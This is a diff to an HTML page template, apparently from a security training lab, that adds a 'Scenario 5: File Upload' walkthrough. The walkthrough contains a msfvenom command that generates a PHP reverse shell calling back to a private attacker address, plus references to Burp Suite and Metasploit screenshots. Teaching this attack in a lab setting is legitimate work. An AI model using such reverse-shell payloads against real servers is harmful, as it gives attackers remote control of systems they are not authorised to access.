@@ -1,1 +1,11 @@
-<p>file-upload works!</p>
+<div class="content mt-3">
+  <h2>Scenario 5: File Upload</h2>
+  <div class="code-title">Shell generation</div>
+  <div class="code">
+    msfvenom -p php/reverse_php LHOST=172.20.0.200 LPORT=9001 -o shell.php
+  </div>
+  <div class="code-title">Burp Suite</div>
+  <img src="./assets/fileUploadBurp.png" />
+  <div class="code-title">Metasploit</div>
+  <img src="./assets/fileUpload.png" />
+</div>
